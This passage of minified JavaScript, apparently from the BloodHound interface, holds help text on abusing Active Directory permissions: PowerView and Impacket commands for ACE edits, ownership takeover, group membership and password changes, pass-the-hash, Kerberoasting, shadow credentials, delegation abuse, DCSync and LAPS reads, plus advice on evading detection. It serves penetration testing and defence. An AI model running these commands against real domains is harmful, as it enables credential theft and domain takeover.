need to set a GenericAll ACE against the OU object itself. This can be accomplished using the Add-DomainObjectAcl function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`," ","if you are not running a process as a member of that group. To do this in conjunction with Add-DomainObjectACL, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsx(t,{variant:"body2",children:"Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as a member of (group that holds the ACE against the OU):"}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity (OU GUID) -Rights All"}),e.jsx(t,{variant:"body2",children:"With full control of the OU, you may now add a new ACE on the OU that will inherit down to the objects under that OU. Below are two options depending on how targeted you choose to be in this step:"}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:"The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. Again, this can be done using PowerView. This time we will use the New-ADObjectAccessControlEntry, which gives us more control over the ACE we add to the OU."}),e.jsxs(t,{variant:"body2",children:["First, we need to reference the OU by its ObjectGUID, not its name. The ObjectGUID for the OU"," ",o," is: ",s,"."]}),e.jsxs(t,{variant:"body2",children:["Next, we will fetch the GUID for all objects. This should be"," ",e.jsx(t,{component:"pre",children:"00000000-0000-0000-0000-000000000000"}),":"]}),e.jsx(t,{component:"pre",children:`$Guids = Get-DomainGUIDMap
$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name`}),e.jsx(t,{variant:"body2",children:'Then we will construct our ACE. This command will create an ACE granting the "JKHOLER" user full control of all descendant objects:'}),e.jsx(t,{component:"pre",children:"$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid"}),e.jsx(t,{variant:"body2",children:"Finally, we will apply this ACE to our target OU:"}),e.jsx(t,{component:"pre",children:`$OU = Get-DomainOU -Raw (OU GUID)
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()`}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:`If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. You could, for example, grant a user "ForceChangePassword" permission against all user objects, or grant a security group the ability to read every GMSA password under a certain OU. Below is an example taken from PowerView's help text on how to grant the "ITADMIN" user the ability to read the LAPS password from all computer objects in the "Workstations" OU:`}),e.jsx(t,{component:"pre",children:`$Guids = Get-DomainGUIDMap
$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name
$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name
$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid
$OU = Get-DomainOU -Raw Workstations
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()`}),e.jsx(t,{variant:"body1",children:"Objects for which ACL inheritance is disabled"}),e.jsx(t,{variant:"body2",children:"It is important to note that the compromise vector described above relies on ACL inheritance and will not work for objects with ACL inheritance disabled, such as objects protected by AdminSDHolder (attribute adminCount=1). This observation applies to any OU child user or computer with ACL inheritance disabled, including objects located in nested sub-OUs."}),e.jsx(t,{variant:"body2",children:"In such a situation, it may still be possible to exploit GenericAll permissions on an OU through an alternative attack vector. Indeed, with GenericAll permissions over an OU, you may make modifications to the gPLink attribute of the OU. The ability to alter the gPLink attribute of an OU may allow an attacker to apply a malicious Group Policy Object (GPO) to all of the OU's child user and computer objects (including the ones located in nested sub-OUs). This can be exploited to make said child objects execute arbitrary commands through an immediate scheduled task, thus compromising them."}),e.jsx(t,{variant:"body2",children:"Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup."}),e.jsxs(t,{variant:"body2",children:["From a domain-joined compromised Windows machine, the gPLink manipulation attack vector may be exploited through Powermad, PowerView and native Windows functionalities. For a detailed outline of exploit requirements and implementation, you can refer to"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://labs.withsecure.com/publications/ou-having-a-laugh",children:"this article"}),"."]}),e.jsx(t,{variant:"body2",children:"Be mindful of the number of users and computers that are in the given OU as they all will attempt to fetch and apply the malicious GPO."}),e.jsx(t,{variant:"body2",children:"Alternatively, the ability to modify the gPLink attribute of an OU can be exploited in conjunction with write permissions on a GPO. In such a situation, an attacker could first inject a malicious scheduled task in the controlled GPO, and then link the GPO to the target OU through its gPLink attribute, making all child users and computers apply the malicious GPO and execute arbitrary commands."})]});case"Container":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"With WriteDacl on the container object, you may grant yourself the GenericAll permission inherited to child objects."}),e.jsx(t,{variant:"body2",children:"This can be done with PowerShell:"}),e.jsx(w,{children:`$containerDN = "CN=USERS,DC=DUMPSTER,DC=FIRE"
                            $principalName = "principal"     # SAM account name of principal
                            
                            # Find the certificate template
                            $template = [ADSI]"LDAP://$containerDN"
                            
                            # Construct the ACE
                            $account = New-Object System.Security.Principal.NTAccount($principalName)
                            $sid = $account.Translate([System.Security.Principal.SecurityIdentifier])
                            $ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(
                                $sid,
                                [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
                                [System.Security.AccessControl.AccessControlType]::Allow,
                                [System.DirectoryServices.ActiveDirectorySecurityInheritance]::Descendents
                            )
                            # Add the new ACE to the ACL
                            $acl = $template.psbase.ObjectSecurity
                            $acl.AddAccessRule($ace)
                            $template.psbase.CommitChanges()`})]});case"CertTemplate":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With WriteDacl permission over a certificate template, you can grant yourself GenericAll. With GenericAll, you may be able to perform an ESC4 attack by modifying the template's attributes. BloodHound will in that case create an ADCSESC4 edge from the principal to the forest domain node."})});case"EnterpriseCA":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With WriteDacl permission over an enterprise CA, you can grant yourself GenericAll. With GenericAll, you can publish certificate templates to the enterprise CA by adding the CN name of the template in the enterprise CA object's certificateTemplates attribute. This action may enable you to perform an ADCS domain escalation."})});case"RootCA":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With WriteDacl permission over a root CA, you can grant yourself GenericAll. With GenericAll, you can make a rogue certificate trusted as a root CA in the AD forest by adding the certificate in the root CA object's cACertificate attribute. This action may enable you to perform an ADCS domain escalation."})});case"NTAuthStore":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With WriteDacl permission over a NTAuth store, you can grant yourself GenericAll. With GenericAll, you can make an enterprise CA certificate trusted for NT (domain) authentication in the AD forest by adding the certificate in the root CA object's cACertificate attribute. This action may enable you to perform an ADCS domain escalation. This action may enable you to perform an ADCS domain escalation."})});case"IssuancePolicy":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With WriteDacl permission over an issuance policy object, you can grant yourself GenericAll. With GenericAll, you create a OID group link to a targeted group by adding the groups distinguishedName in the msDS-OIDToGroupLink attribute of the issuance policy object. This action may enable you to gain membership of the group through an ADCS ESC13 attack."})});default:return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"No abuse information available for this node type."})})}},Wb={general:Mb,windowsAbuse:Ub,linuxAbuse:Lb,opsec:Fb,references:_b},Bb=({sourceName:r,sourceType:a,targetType:o,targetName:i})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[E(a,r)," has the permissions to modify the gPLink attribute of"," ",o," ",i,"."]}),e.jsx(t,{variant:"body2",children:"The ability to alter the gPLink attribute may allow an attacker to apply a malicious Group Policy Object (GPO) to all child user and computer objects (including the ones located in nested OUs). This can be exploited to make said child objects execute arbitrary commands through an immediate scheduled task, thus compromising them."}),e.jsx(t,{variant:"body2",children:"Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup."}),e.jsx(t,{variant:"body2",children:"Alternatively, the ability to modify the gPLink attribute can be exploited in conjunction with write permissions on a GPO. In such a situation, an attacker could first inject a malicious scheduled task in the controlled GPO, and then link the GPO to the target through its gPLink attribute, making all child users and computers apply the malicious GPO and execute arbitrary commands."})]}),qb=()=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["From a Linux machine, the WriteGPLink permission may be abused using the"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/synacktiv/OUned",children:"OUned.py"})," ","exploitation tool. For a detailed outline of exploit requirements and implementation, you can refer to"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory",children:"the article associated to the OUned.py tool"}),"."]}),e.jsx(t,{variant:"body2",children:"Be mindful of the number of users and computers that are in the given domain as they all will attempt to fetch and apply the malicious GPO."})]}),Kb=()=>e.jsx(t,{variant:"body2",children:"The present attack vector relies on the execution of a malicious Group Policy Object. In case some objects in the target Organizational Unit are unable to apply said Group Policy Object (for instance, because these objects cannot reach the attacker's machine in the internal network), events related to failed GPO application will be created. Furthermore, the execution of this attack will result in the modification of the gPLink property of the target Organizational Unit. The property should be reset to its original value after attack execution to avoid detection and ensure the OU child items can apply their legitimate Group Policy Objects again."}),zb=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://labs.withsecure.com/publications/ou-having-a-laugh",children:"https://labs.withsecure.com/publications/ou-having-a-laugh"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory",children:"https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory"})]}),Hb=()=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["From a domain-joined compromised Windows machine, the WriteGPLink permission may be abused through Powermad, PowerView and native Windows functionalities. For a detailed outline of exploit requirements and implementation, you can refer to"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://labs.withsecure.com/publications/ou-having-a-laugh",children:"this article"}),"."]}),e.jsx(t,{variant:"body2",children:"Be mindful of the number of users and computers that are in the given domain as they all will attempt to fetch and apply the malicious GPO."})]}),Vb={general:Bb,windowsAbuse:Hb,linuxAbuse:qb,opsec:Kb,references:zb},Yb=({sourceName:r,sourceType:a,targetName:o,targetType:i})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[E(a,r)," the ability to modify the owner of the"," ",N(i)," ",o,"."]}),e.jsxs(t,{variant:"body2",children:["Implicit owner rights are not blocked and are therefore abusable via change in ownership when the following conditions are met:",e.jsxs("ul",{children:[e.jsx("li",{children:"Inheritance is not configured for any privileges explicitly granted to the OWNER RIGHTS SID (S-1-3-4). Non-inherited privileges granted to OWNER RIGHTS are removed when the owner is changed, allowing the new owner to have the full set of implicit owner rights."}),e.jsx("li",{children:"The domain's BlockOwnerImplicitRights setting is not in enforcement mode. This setting is defined in the 29th character in the domain's dSHeuristics attribute. When set to 0 or 2, implicit owner rights are not blocked."}),e.jsx(t,{component:"pre",children:`$searcher = [adsisearcher]""
$searcher.SearchRoot = "LDAP://CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=EXAMPLE,DC=LOCAL"
$searcher.SearchScope = [System.DirectoryServices.SearchScope]::Base
$searcher.Filter = "(objectClass=*)"
$searcher.PropertiesToLoad.Add("DSHeuristics") | Out-Null
$result = $searcher.FindOne()
Write-Output "DSHeuristics: $($result.Properties['DSHeuristics'])"`}),e.jsx("li",{children:"The object is not a computer or a derivative of a computer object (e.g., MSA, GMSA)."})]})]})]}),Qb=({sourceName:r,targetName:a,targetType:o,haslaps:i})=>{switch(o){case"Group":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:`To change the ownership of the object, you may use Impacket's owneredit example script (cf. "grant ownership" reference for the exact link).`}),e.jsx(t,{component:"pre",children:"owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"}),e.jsx(t,{variant:"body1",children:" Modifying the rights "}),e.jsx(t,{variant:"body2",children:"To abuse ownership of a group object, you may grant yourself the AddMember permission."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'WriteMembers' -principal 'controlledUser' -target-dn 'groupDistinguidedName' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body1",children:" Adding to the group "}),e.jsx(t,{variant:"body2",children:"You can now add members to the group."}),e.jsx(t,{variant:"body2",children:"Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:"}),e.jsx(t,{component:"pre",children:'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsxs(t,{variant:"body2",children:["It can also be done with pass-the-hash using"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'."]}),e.jsx(t,{component:"pre",children:'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group:"}),e.jsx(t,{component:"pre",children:'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsx(t,{variant:"body1",children:" Cleanup "}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'remove' -rights 'WriteMembers' -principal 'controlledUser' -target-dn 'groupDistinguidedName' 'domain'/'controlledUser':'password'"})]});case"User":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:`To change the ownership of the object, you may use Impacket's owneredit example script (cf. "grant ownership" reference for the exact link).`}),e.jsx(t,{component:"pre",children:"owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"}),e.jsx(t,{variant:"body2",children:"To abuse ownership of a user object, you may grant yourself the GenericAll permission."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'remove' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body1",children:" Targeted Kerberoast "}),e.jsxs(t,{variant:"body2",children:["A targeted kerberoast attack can be performed using"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ShutdownRepo/targetedKerberoast",children:"targetedKerberoast.py"}),"."]}),e.jsx(t,{component:"pre",children:"targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'"}),e.jsx(t,{variant:"body2",children:"The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well."}),e.jsx(t,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice."}),e.jsx(t,{variant:"body1",children:" Force Change Password "}),e.jsx(t,{variant:"body2",children:"Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line."}),e.jsx(t,{component:"pre",children:'net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsxs(t,{variant:"body2",children:["It can also be done with pass-the-hash using"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'."]}),e.jsx(t,{component:"pre",children:'pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),e.jsx(t,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this permission, use"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Computer":return i?e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:`To change the ownership of the object, you may use Impacket's owneredit example script (cf. "grant ownership" reference for the exact link).`}),e.jsx(t,{component:"pre",children:"owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"}),e.jsx(t,{variant:"body2",children:"To abuse ownership of a computer object, you may grant yourself the GenericAll permission."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'remove' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body1",children:" Retrieve LAPS Password "}),e.jsxs(t,{variant:"body2",children:["The GenericAll permission allows ",r," to retrieve the LAPS (RID 500 administrator) password for ",a,"."]}),e.jsxs(t,{variant:"body2",children:["For systems using legacy LAPS, the following AD computer object properties are relevant:",e.jsx("br",{}),e.jsx("b",{children:"- ms-Mcs-AdmPwd"}),": The plaintext LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- ms-Mcs-AdmPwdExpirationTime"}),": The LAPS password expiration time",e.jsx("br",{})]}),e.jsxs(t,{variant:"body2",children:["For systems using Windows LAPS (2023 edition), the following AD computer object properties are relevant:",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-Password"}),": The plaintext LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-PasswordExpirationTime"}),": The LAPS password expiration time",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedPassword"}),": The encrypted LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedPasswordHistory"}),": The encrypted LAPS password history",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedDSRMPassword"}),": The encrypted Directory Services Restore Mode (DSRM) password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedDSRMPasswordHistory"}),": The encrypted DSRM password history",e.jsx("br",{})]}),e.jsx(t,{variant:"body2",children:"Plaintext attributes can be read using a simple LDAP client. For example, with bloodyAD:"}),e.jsx(t,{component:"pre",children:"bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime"}),e.jsx(t,{variant:"body2",children:"See Windows abuse for retrieving and decrypting the encrypted attributes."}),e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation "}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),e.jsx(t,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),e.jsx(t,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:`And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.`}),e.jsx(t,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),e.jsx(t,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this permission, use"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]}):e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:`To change the ownership of the object, you may use Impacket's owneredit example script (cf. "grant ownership" reference for the exact link).`}),e.jsx(t,{component:"pre",children:"owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"}),e.jsx(t,{variant:"body2",children:"To abuse ownership of a computer object, you may grant yourself the GenericAll permission."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'remove' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation "}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),e.jsx(t,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),e.jsx(t,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:`And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.`}),e.jsx(t,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),e.jsx(t,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this permission, use"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Domain":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:`To change the ownership of the object, you may use Impacket's owneredit example script (cf. "grant ownership" reference for the exact link).`}),e.jsx(t,{component:"pre",children:"owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"}),e.jsx(t,{variant:"body2",children:"To abuse ownership of a domain object, you may grant yourself the DcSync permissions."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'DCSync' -principal 'controlledUser' -target-dn 'DomainDisinguishedName' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'remove' -rights 'DCSync' -principal 'controlledUser' -target-dn 'DomainDisinguishedName' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body1",children:" DCSync "}),e.jsxs(t,{variant:"body2",children:["The AllExtendedRights permission grants ",r," both the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All permissions, which combined allow a principal to replicate objects from the domain ",a,"."]}),e.jsx(t,{variant:"body2",children:"This can be abused using Impacket's secretsdump.py example script:"}),e.jsx(t,{component:"pre",children:"secretsdump 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'"}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:`The simplest and most straight forward way to obtain control of the objects of the domain is to apply a GenericAll ACE on the domain that will inherit down to all object types. This can be done using Impacket's dacledit (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'DomainDistinguishedName' 'domain'/'user':'password'"}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Objects for which ACL inheritance is disabled"}),e.jsx(t,{variant:"body2",children:"The compromise vector described above relies on ACL inheritance and will not work for objects with ACL inheritance disabled, such as objects protected by AdminSDHolder (attribute adminCount=1). This observation applies to any user or computer with inheritance disabled, including objects located in nested OUs."}),e.jsx(t,{variant:"body2",children:"In such a situation, it may still be possible to exploit GenericAll permissions on a domain object through an alternative attack vector. Indeed, with GenericAll permissions over a domain object, you may make modifications to the gPLink attribute of the domain. The ability to alter the gPLink attribute of a domain may allow an attacker to apply a malicious Group Policy Object (GPO) to all of the domain user and computer objects (including the ones located in nested OUs). This can be exploited to make said child objects execute arbitrary commands through an immediate scheduled task, thus compromising them."}),e.jsx(t,{variant:"body2",children:"Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup."}),e.jsxs(t,{variant:"body2",children:["From a Linux machine, the gPLink manipulation attack vector may be exploited using the"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/synacktiv/OUned",children:"OUned.py"})," ","tool. For a detailed outline of exploit requirements and implementation, you can refer to"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory",children:"the article associated to the OUned.py tool"}),"."]}),e.jsx(t,{variant:"body2",children:"Be mindful of the number of users and computers that are in the given domain as they all will attempt to fetch and apply the malicious GPO."}),e.jsx(t,{variant:"body2",children:"Alternatively, the ability to modify the gPLink attribute of a domain can be exploited in conjunction with write permissions on a GPO. In such a situation, an attacker could first inject a malicious scheduled task in the controlled GPO, and then link the GPO to the target domain through its gPLink attribute, making all child users and computers apply the malicious GPO and execute arbitrary commands."})]});case"GPO":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:`To change the ownership of the object, you may use Impacket's owneredit example script (cf. "grant ownership" reference for the exact link).`}),e.jsx(t,{component:"pre",children:"owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"}),e.jsx(t,{variant:"body2",children:"To abuse ownership of a GPO, you may grant yourself the GenericAll permission."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 